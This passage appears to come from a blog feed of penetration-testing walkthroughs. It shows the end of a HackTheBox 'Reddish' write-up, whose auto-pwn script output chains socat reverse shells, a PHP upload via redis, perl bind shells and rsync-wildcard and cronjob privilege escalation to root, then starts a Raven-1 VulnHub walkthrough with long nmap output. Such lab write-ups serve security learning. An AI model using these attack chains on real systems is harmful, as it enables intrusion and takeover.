class="line">[*] Closed connection to 10.10.10.94 port 36186</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending <span class="keyword">in</span> interactive</span><br><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># python autopwnreddish.py </span></span><br><span class="line">What shell <span class="keyword">do</span> you want?</span><br><span class="line">[1] root@nodered</span><br><span class="line">[2] www-data@www</span><br><span class="line">[3] root@www</span><br><span class="line">[4] root@backup</span><br><span class="line">[5] root@reddish</span><br><span class="line">[6] Exit</span><br><span class="line">Please enter a number 1-6: 5</span><br><span class="line">[+] Getting our id: OK (id = c507228abb96d45d0541fd5eacebd9dd)</span><br><span class="line">[+] Trying to <span class="built_in">bind</span> to 10.10.14.9 on port 60000: Done</span><br><span class="line">[+] Waiting <span class="keyword">for</span> connections on 10.10.14.9:60000: Got connection from 10.10.10.94 on port 36192</span><br><span class="line">[+] Loading node-red flows: OK</span><br><span class="line">[+] Injecting base64-encoded socat: OK</span><br><span class="line">[+] Injecting socat reverse shell via nodejs [10.10.14.9:60000]: OK</span><br><span class="line">[+] Uploading 83df6e1b.php on the www container via redis: OK (user = www-data@www)</span><br><span class="line">[+] Sending perl <span class="built_in">bind</span> shell [www-data@www:62236] via 83df6e1b.php &amp; trying to connect: OK</span><br><span class="line">[+] Exploiting wildcards <span class="keyword">for</span> privesc. Wait at most 180 secs <span class="keyword">for</span> rsync backup job to run: OK</span><br><span class="line">[+] Sending a cronjob <span class="keyword">for</span> <span class="built_in">bind</span> shell [root@backup:65274]. Please <span class="built_in">wait</span>: OK</span><br><span class="line">[+] Sending reverse shell cronjob [10.10.14.9:60001] <span class="keyword">for</span> root@host. Please <span class="built_in">wait</span>: OK</span><br><span class="line">[+] Trying to <span class="built_in">bind</span> to 10.10.14.9 on port 60001: Done</span><br><span class="line">[+] Waiting <span class="keyword">for</span> connections on 10.10.14.9:60001: Got connection from 10.10.10.94 on port 49704</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">root@reddish:~<span class="comment"># $ id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@reddish:~<span class="comment"># $ whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@reddish:~<span class="comment"># $ hostname</span></span><br><span class="line">hostname</span><br><span class="line">reddish</span><br><span class="line">root@reddish:~<span class="comment"># $ ls</span></span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">root@reddish:~<span class="comment"># $ cat root.txt</span></span><br><span class="line">cat root.txt</span><br><span class="line">50d0db644c8d5ff5312ef3d17c2ed205</span><br></pre></td></tr></table></figure>

<p>very very powerful scripts!!!</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb59.jpg"></li>
</ul>
<h4 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h4><ul>
<li>Code Execution and getShell in Node-Red</li>
<li>Network Enumeration and ping sweep</li>
<li>upgrade path to Meterpreter using sessions -u</li>
<li>compolicated port forwarding tech</li>
<li>error information disclosure</li>
<li>redis service getshell</li>
<li>socat port forwarding</li>
<li>Exploiting the Wildcard and cronjob to privesc</li>
<li>perl and port forwarding to download file</li>
<li>use port 873 rsync service and cron job to getshell and privesc</li>
<li>beyong root research</li>
<li>Dropbear Create Tunnel and get root shell</li>
<li>python auto-pwn script</li>
</ul>
<h4 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h4><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
]]></content>
      <categories>
        <category>HackTheBox walkthrough</category>
      </categories>
      <tags>
        <tag>HackTheBox靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Raven-1]</title>
    <url>/2020/02/12/Raven-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：Raven：1<br>发布日期：2018年8月14日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MXBDRnYtT1hta25MVmx1VXVfOFpDRHIxWFlXUERmTHhX">https://drive.google.com/open?id=1pCFv-OXmknLVluUu_8ZCDr1XYWPDfLxW<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9yYXZlbi9SYXZlbi5vdmE=">https://download.vulnhub.com/raven/Raven.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9yYXZlbi9SYXZlbi5vdmEudG9ycmVudA==">https://download.vulnhub.com/raven/Raven.ova.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>Raven是初学者/中级boot2root计算机。有四个flag可以找到，并且有两个预期的root方法。使用VMware构建并在Virtual Box上进行了测试。设置为使用NAT网络。</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.118</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">MAC Address: 08:00:27:D2:E6:4F (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -p- -sV -v -Pn 192.168.56.118</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">36286/tcp open  status  1 (RPC <span class="comment">#100024)</span></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -p- -sU -Pn -v 192.168.56.118 --min-rate=10000</span></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">111/udp open  rpcbind</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -p 22,80,111,36286 -sV -v -Pn -A --script all 192.168.56.118 --min-rate=100000</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span><br><span class="line">|_banner: SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u4</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| ssh-auth-methods: </span><br><span class="line">|   Supported authentication methods: </span><br><span class="line">|     publickey</span><br><span class="line">|_    password</span><br><span class="line">| ssh-brute: </span><br><span class="line">|   Accounts: No valid accounts found</span><br><span class="line">|_  Statistics: Performed 0 guesses <span class="keyword">in</span> 1807 seconds, average tps: 0.0</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:<span class="built_in">fc</span> (DSA)</span><br><span class="line">|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)</span><br><span class="line">|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)</span><br><span class="line">|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)</span><br><span class="line">| ssh-publickey-acceptance: </span><br><span class="line">|_  Accepted Public Keys: No public keys accepted</span><br><span class="line">|_ssh-run: Failed to specify credentials and <span class="built_in">command</span> to run.</span><br><span class="line">| ssh2-enum-algos: </span><br><span class="line">|   kex_algorithms: (6)</span><br><span class="line">|       curve25519-sha256@libssh.org</span><br><span class="line">|       ecdh-sha2-nistp256</span><br><span class="line">|       ecdh-sha2-nistp384</span><br><span class="line">|       ecdh-sha2-nistp521</span><br><span class="line">|       diffie-hellman-group-exchange-sha256</span><br><span class="line">|       diffie-hellman-group14-sha1</span><br><span class="line">|   server_host_key_algorithms: (4)</span><br><span class="line">|       ssh-rsa</span><br><span class="line">|       ssh-dss</span><br><span class="line">|       ecdsa-sha2-nistp256</span><br><span class="line">|       ssh-ed25519</span><br><span class="line">|   encryption_algorithms: (6)</span><br><span class="line">|       aes128-ctr</span><br><span class="line">|       aes192-ctr</span><br><span class="line">|       aes256-ctr</span><br><span class="line">|       aes128-gcm@openssh.com</span><br><span class="line">|       aes256-gcm@openssh.com</span><br><span class="line">|       chacha20-poly1305@openssh.com</span><br><span class="line">|   mac_algorithms: (10)</span><br><span class="line">|       umac-64-etm@openssh.com</span><br><span class="line">|       umac-128-etm@openssh.com</span><br><span class="line">|       hmac-sha2-256-etm@openssh.com</span><br><span class="line">|       hmac-sha2-512-etm@openssh.com</span><br><span class="line">|       hmac-sha1-etm@openssh.com</span><br><span class="line">|       umac-64@openssh.com</span><br><span class="line">|       umac-128@openssh.com</span><br><span class="line">|       hmac-sha2-256</span><br><span class="line">|       hmac-sha2-512</span><br><span class="line">|       hmac-sha1</span><br><span class="line">|   compression_algorithms: (2)</span><br><span class="line">|       none</span><br><span class="line">|_      zlib@openssh.com</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_citrix-brute-xml: FAILED: No domain specified (use ntdomain argument)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-brute:   </span><br><span class="line">|_  Path <span class="string">&quot;/&quot;</span> does not require authentication</span><br><span class="line">|_http-chrono: Request <span class="built_in">times</span> <span class="keyword">for</span> /; avg: 284.71ms; min: 236.36ms; max: 327.61ms</span><br><span class="line">| http-comments-displayer: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.118</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/about.html</span><br><span class="line">|     Line number: 16</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- Site Title --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/owl.carousel.css</span><br><span class="line">|     Line number: 112</span><br><span class="line">|     Comment: </span><br><span class="line">|         </span><br><span class="line">|         </span><br><span class="line">|          */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 3425</span><br><span class="line">|     Comment: </span><br><span class="line">|         /*</span><br><span class="line">|         <span class="comment">################</span></span><br><span class="line">|                        End Blog Details  Page style</span><br><span class="line">|         <span class="comment">################</span></span><br><span class="line">|         */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 1989</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Nav Menu Essentials */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 2028</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Nav Menu Arrows */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 10</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Code <span class="keyword">for</span> Firefox */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/about.html</span><br><span class="line">|     Line number: 196</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- Start team Area --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/owl.carousel.css</span><br><span class="line">|     Line number: 81</span><br><span class="line">|     Comment: </span><br><span class="line">|         </span><br><span class="line">|         </span><br><span class="line">|          */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/about.html</span><br><span class="line">|     Line number: 12</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- Meta Keyword --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 150</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- <span class="comment">#colophon --&gt;</span></span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/jquery.counterup.min.js</span><br><span class="line">|     Line number: 1</span><br><span class="line">|     Comment: </span><br><span class="line">|         /*!</span><br><span class="line">|         * jquery.counterup.js 1.0</span><br><span class="line">|         *</span><br><span class="line">|         * Copyright 2013, Benjamin Intal http://gambit.ph @bfintal</span><br><span class="line">|         * Released under the GPL v2 License</span><br><span class="line">|         *</span><br><span class="line">|         * Date: Nov 26, 2013</span><br><span class="line">|         */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 106</span><br><span class="line">|     Comment: </span><br><span class="line">|         /**</span><br><span class="line">|          *  Typography</span><br><span class="line">|          *</span><br><span class="line">|          **/</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/waypoints.min.js</span><br><span class="line">|     Line number: 2</span><br><span class="line">|     Comment: </span><br><span class="line">|         /*</span><br><span class="line">|         jQuery Waypoints - v2.0.3</span><br><span class="line">|         Copyright (c) 2011-2013 Caleb Troughton</span><br><span class="line">|         Dual licensed under the MIT license and GPL license.</span><br><span class="line">|         https://github.com/imakewebthings/jquery-waypoints/blob/master/licenses.txt</span><br><span class="line">|         */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/mail-script.js</span><br><span class="line">|     Line number: 15</span><br><span class="line">|     Comment: </span><br><span class="line">|          // request <span class="built_in">type</span> html/json/xml</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/about.html</span><br><span class="line">|     Line number: 4</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- Mobile Specific Meta --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 1</span><br><span class="line">|     Comment: </span><br><span class="line">|         /*--------------------------- Color variations ----------------------*/</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 7</span><br><span class="line">|     Comment: </span><br><span class="line">|         /*  Basic Style </span><br><span class="line">|         /* =================================== */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 47</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Microsoft Edge */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 2208</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Mobile Nav body classes */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 107</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- <span class="comment">#main --&gt;</span></span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 2057</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Nav Meu Styling */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 75</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- .site-branding --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/contact.php</span><br><span class="line">|     Line number: 148</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- End contact-page Area --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/index.html</span><br><span class="line">|     Line number: 291</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- End galery Area --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 156</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* ]]&gt; */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/owl.carousel.css</span><br><span class="line">|     Line number: 129</span><br><span class="line">|     Comment: </span><br><span class="line">|         </span><br><span class="line">|         </span><br><span class="line">|          */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 154</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* &lt;![CDATA[ */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/jquery.sticky.js</span><br><span class="line">|     Line number: 8</span><br><span class="line">|     Comment: </span><br><span class="line">|         </span><br><span class="line">|         // Website: http://labs.anthonygarand.com/sticky</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 152</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- <span class="comment">#page --&gt;</span></span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 34</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Mozilla Firefox 19+ */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/superfish.min.js</span><br><span class="line">|     Line number: 1</span><br><span class="line">|     Comment: </span><br><span class="line">|         /*</span><br><span class="line">|          * jQuery Superfish Menu Plugin - v1.7.9</span><br><span class="line">|          * Copyright (c) 2016 Joel Birch</span><br><span class="line">|          *</span><br><span class="line">|          * Dual licensed under the MIT and GPL licenses:</span><br><span class="line">|          *    http://www.opensource.org/licenses/mit-license.php</span><br><span class="line">|          *    http://www.gnu.org/licenses/gpl.html</span><br><span class="line">|          */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 4</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Mobile Layout: 320px */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/jquery.sticky.js</span><br><span class="line">|     Line number: 6</span><br><span class="line">|     Comment: </span><br><span class="line">|         </span><br><span class="line">|         // Created: 2/14/2011</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 27</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Mozilla Firefox 4 to 18 */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 141</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- <span class="comment">#content --&gt;</span></span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 80</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- <span class="comment">#masthead --&gt;</span></span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 137</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- <span class="comment">#secondary --&gt;</span></span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 105</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- <span class="comment">#post-## --&gt;</span></span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 108</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- <span class="comment">#primary --&gt;</span></span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 102</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- .entry-content --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 97</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- .entry-header --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/mail-script.js</span><br><span class="line">|     Line number: 16</span><br><span class="line">|     Comment: </span><br><span class="line">|          // serialize form data</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 6</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* =================================== */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/index.html</span><br><span class="line">|     Line number: 210</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- End feature Area --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 3</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Tablet Layout: 768px */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/owl.carousel.css</span><br><span class="line">|     Line number: 77</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* No Js */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/owl.carousel.css</span><br><span class="line">|     Line number: 118</span><br><span class="line">|     Comment: </span><br><span class="line">|         </span><br><span class="line">|         </span><br><span class="line">|          */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 77</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- .custom-header --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/jquery.sticky.js</span><br><span class="line">|     Line number: 140</span><br><span class="line">|     Comment: </span><br><span class="line">|          // should be more efficient than using <span class="variable">$window</span>.scroll(scroller) and <span class="variable">$window</span>.resize(resizer):</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 21</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* WebKit, Blink, Edge */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/jquery.magnific-popup.min.js</span><br><span class="line">|     Line number: 1</span><br><span class="line">|     Comment: </span><br><span class="line">|         /*! Magnific Popup - v1.1.0 - 2016-02-20</span><br><span class="line">|         * http://dimsemenov.com/plugins/magnific-popup/</span><br><span class="line">|         * Copyright (c) 2016 Dmitry Semenov; */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 2</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Medium Layout: 1280px */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 70</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- .site-branding-text --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/about.html</span><br><span class="line">|     Line number: 14</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- meta character <span class="built_in">set</span> --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/about.html</span><br><span class="line">|     Line number: 269</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- start footer Area --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 41</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Internet Explorer 10-11 */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/linearicons.css</span><br><span class="line">|     Line number: 22</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Better Font Rendering =========== */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/about.html</span><br><span class="line">|     Line number: 74</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- start banner Area --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 39</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!--[<span class="keyword">if</span> lt IE 9]&gt;</span><br><span class="line">|         &lt;script <span class="built_in">type</span>=<span class="string">&#x27;text/javascript&#x27;</span> src=<span class="string">&#x27;http://raven.local/wordpress/wp-content/themes/twentyseventeen/assets/js/html5.js?ver=3.7.3&#x27;</span>&gt;&lt;/script&gt;</span><br><span class="line">|         &lt;![endif]--&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 36</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!--[<span class="keyword">if</span> lt IE 9]&gt;</span><br><span class="line">|         &lt;link rel=<span class="string">&#x27;stylesheet&#x27;</span> id=<span class="string">&#x27;twentyseventeen-ie8-css&#x27;</span>  href=<span class="string">&#x27;http://raven.local/wordpress/wp-content/themes/twentyseventeen/assets/css/ie8.css?ver=1.0&#x27;</span> <span class="built_in">type</span>=<span class="string">&#x27;text/css&#x27;</span> media=<span class="string">&#x27;all&#x27;</span> /&gt;</span><br><span class="line">|         &lt;![endif]--&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/jquery.nice-select.min.js</span><br><span class="line">|     Line number: 1</span><br><span class="line">|     Comment: </span><br><span class="line">|         /*  jQuery Nice Select - v1.0</span><br><span class="line">|             https://github.com/hernansartorio/jquery-nice-select</span><br><span class="line">|             Made by Hern\xC3\xA1n Sartorio  */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/owl.carousel.css</span><br><span class="line">|     Line number: 6</span><br><span class="line">|     Comment: </span><br><span class="line">|         </span><br><span class="line">|         </span><br><span class="line">|          */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 97</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- .entry-meta --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/owl.carousel.css</span><br><span class="line">|     Line number: 29</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* fix <span class="keyword">for</span> flashing background */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/owl.carousel.css</span><br><span class="line">|     Line number: 13</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* position relative and z-index fix webkit rendering fonts issue */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 2101</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Mobile Nav Toggle */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/index.html</span><br><span class="line">|     Line number: 368</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- End blog Area --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/about.html</span><br><span class="line">|     Line number: 20</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!--</span><br><span class="line">|                               CSS</span><br><span class="line">|                               ============================================= --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/parallax.min.js</span><br><span class="line">|     Line number: 1</span><br><span class="line">|     Comment: </span><br><span class="line">|         /*!</span><br><span class="line">|          * parallax.js v1.5.0 (http://pixelcog.github.io/parallax.js/)</span><br><span class="line">|          * @copyright 2016 PixelCog, Inc.</span><br><span class="line">|          * @license MIT (https://github.com/pixelcog/parallax.js/blob/master/LICENSE)</span><br><span class="line">|          */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/jquery.ajaxchimp.min.js</span><br><span class="line">|     Line number: 103</span><br><span class="line">|     Comment: </span><br><span class="line">|          // Translate and display submit message</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/jquery.ajaxchimp.min.js</span><br><span class="line">|     Line number: 69</span><br><span class="line">|     Comment: </span><br><span class="line">|          // Translate and display message</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 151</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- .site-content-contain --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/mail-script.js</span><br><span class="line">|     Line number: 10</span><br><span class="line">|     Comment: </span><br><span class="line">|          // prevent default form submit</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 148</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- .site-info --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/mail-script.js</span><br><span class="line">|     Line number: 23</span><br><span class="line">|     Comment: </span><br><span class="line">|          // reset form</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/mail-script.js</span><br><span class="line">|     Line number: 22</span><br><span class="line">|     Comment: </span><br><span class="line">|          // fade 